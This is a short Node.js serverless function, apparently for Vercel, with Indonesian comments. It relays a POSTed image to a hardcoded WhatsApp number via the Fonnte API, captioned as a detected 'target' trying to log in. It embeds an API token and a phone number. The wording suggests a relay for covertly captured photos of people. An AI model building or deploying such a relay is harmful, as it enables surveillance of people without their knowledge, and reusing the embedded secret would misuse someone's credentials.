const axios = require('axios');

module.exports = async (req, res) => {
    // Setting Header agar tidak error CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    if (req.method === 'POST') {
        const { image } = req.body;
        
        try {
            // Kirim ke Fonnte
            const response = await axios.post('https://api.fonnte.com/send', {
                target: '6285117090357',
                url: image,
                caption: '🚨 *TARGET TERDETEKSI (VERCEL)* 🚨\nSeseorang mencoba login.',
            }, {
                headers: { 'Authorization': 'PG3GRjmArXV4PHYgQaFz' }
            });

            return res.status(200).json({ success: true, log: response.data });
        } catch (error) {
            return res.status(500).json({ success: false, error: error.message });
        }
    } else {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }
};